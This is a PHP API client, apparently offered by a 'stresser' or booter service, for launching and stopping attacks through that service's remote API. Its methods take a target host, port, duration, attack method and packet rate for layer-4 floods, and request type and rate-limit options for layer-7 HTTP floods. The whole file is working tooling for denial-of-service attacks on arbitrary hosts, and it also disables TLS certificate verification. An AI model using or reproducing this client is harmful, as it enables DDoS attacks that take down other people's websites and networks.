<?php
/*
 *  Instant-Stresser.com PHP API cURL Example.
 *  
 *  @author  MachiavelSST
 *  @link    https://instant-stresser.com/
 *
*/

class API {
	
	/**
 	* @param int $userID
	* @param string $key
 	*/
	
	private $userID = "";
	private $key = "";   
	private $curl_handle = null;
	
	public function __construct($userID, $key){
		$this->userID = $userID;
		$this->apiKey = $key;
		try {
			if(empty($this->userID) || empty($this->apiKey)){
				throw new Exception('UserID and API Key must be defined.');
			}
		} catch (Exception $e) {
			exit($e->getMessage());
		}
	}
	
	public function __destruct() {
		if (!is_null($this->curl_handle)){
			curl_close($this->curl_handle);
		}
	}
	
	/**
 	* @param string $host
	* @param int $port
	* @param int $time
	* @param string $method
	* @param int $slots
	* @param int $pps
	* @return string
 	*/
	
	public function startL4($host, $port, $time, $method, $slots = 1, $pps = 100000){
		$postdata = [
			'host' => $host,
			'port' => $port,
			'time' => $time,
			'method' => $method,
			'slots' => $slots,
			'pps' => $pps
		];
		return $this->send($postdata);
	}
	
	/**
 	* @param string $host
	* @param int $time
	* @param string $method
	* @param int $slots
	* @param string $type
	* @param bool $ratelimit
	* @return string
 	*/
	
	public function startL7($host, $time, $method, $slots = 1, $type = "GET", $ratelimit = false){
		$postdata = [
			'host' => $host,
			'time' => $time,
			'method' => $method,
			'slots' => $slots,
			'type' => $type,
			'ratelimit' => $ratelimit
		];
		return $this->send($postdata);
	}
	
	/**
 	* @param string $host
	* @return string
 	*/
	
	public function stopAttack($host){
		$postdata = [
			'host' => $host
		];
		return $this->send($postdata, "stop");
	}
	
	/**
 	* @param array $parameters
	* @param string $action
	* @return string
 	*/
	
	private function send(array $parameters = [], $action = "start"){
		$api_url = "https://api.instant-stresser.com/" . $action;
		$parameters['user'] = $this->userID;
		$parameters['api_key'] = $this->apiKey;
		$parameters = http_build_query($parameters, '', '&');
		if(is_null($this->curl_handle)){
			$this->curl_handle = curl_init($api_url);
			curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, TRUE);
			curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($this->curl_handle, CURLOPT_ENCODING, "");
			curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);
			curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
			curl_setopt($this->curl_handle, CURLOPT_POST, 1);
			curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $parameters);
			curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER , array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));
		}
		switch($response = curl_exec($this->curl_handle)){
			case false:
				return curl_error($this->curl_handle);
			break;
			default:
				$response = json_decode($response, true);
				return $response["message"];
			break;
		}
	}
}


?>
